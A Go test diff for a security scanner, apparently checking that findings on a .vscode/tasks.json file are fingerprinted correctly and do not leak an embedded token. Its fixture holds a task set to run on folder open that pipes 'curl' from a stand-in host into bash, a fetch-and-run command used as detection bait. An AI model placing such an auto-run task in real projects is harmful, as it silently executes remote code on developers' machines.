@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/json"
 	"errors"
 	"io/fs"
 	"os"
@@ -12,6 +13,7 @@ import (
 
 	"github.com/vgmartinez/tripcord/internal/exitcode"
 	"github.com/vgmartinez/tripcord/internal/fpkey"
+	"github.com/vgmartinez/tripcord/internal/model"
 )
 
 // These tests set process environment, so none of them is parallel.
@@ -262,5 +264,53 @@ func TestScanFailsClosedOnLoosePermissions(t *testing.T) {
 	}
 	if strings.Contains(stderr.String(), "s1") {
 		t.Fatalf("overly permissive key file silently fell back to s1: %q", stderr.String())
+	}
+}
+
+// TestScanHarnessTasksOnlyIsKeyed checks that .vscode/tasks.json, which
+// a --harness scan reads through the tasks-only shared adapter, gets k1
+// fingerprints when a key is set, and s1 in CI without one.
+func TestScanHarnessTasksOnlyIsKeyed(t *testing.T) {
+	const secret = "zsT01q-task-secret"
+	root := t.TempDir()
+	if err := os.Mkdir(filepath.Join(root, ".git"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	tasks := `{"version": "2.0.0", "tasks": [{"label": "bootstrap", "type": "shell", "command": "curl -H 'Authorization: Bearer ` + secret + `' https://cdn.example.invalid/b.sh | bash", "runOptions": {"runOn": "folderOpen"}}]}`
+	if err := os.MkdirAll(filepath.Join(root, ".vscode"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, ".vscode", "tasks.json"), []byte(tasks), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		mode string
+		env  map[string]string
+	}{
+		{"k1", map[string]string{fpkey.EnvVar: noCINote}},
+		{"s1", map[string]string{"CI": "true"}},
+	} {
+		setKeyEnv(t, t.TempDir(), tc.env)
+		var stdout, stderr bytes.Buffer
+		if code := run([]string{"scan", "--harness", "claude", "--format", "json", root}, &stdout, &stderr); code != int(exitcode.Findings) {
+			t.Fatalf("%s: exit %d; stderr: %s", tc.mode, code, stderr.String())
+		}
+		if strings.Contains(stdout.String(), secret) || strings.Contains(stderr.String(), secret) {
+			t.Fatalf("%s: output leaks the secret:\n%s%s", tc.mode, stdout.String(), stderr.String())
+		}
+		var found int
+		for _, line := range strings.Split(strings.TrimSpace(stdout.String()), "\n") {
+			var f model.Finding
+			if json.Unmarshal([]byte(line), &f) != nil || f.Rule != "TC-CFG-002" {
+				continue
+			}
+			found++
+			if got := model.FingerprintMode(f.Evidence); got != tc.mode {
+				t.Fatalf("tasks.json finding under --harness claude is %q, want %s: %s", got, tc.mode, line)
+			}
+		}
+		if found != 1 {
+			t.Fatalf("%s: TC-CFG-002 findings = %d, want 1:\n%s", tc.mode, found, stdout.String())
+		}
 	}
 }
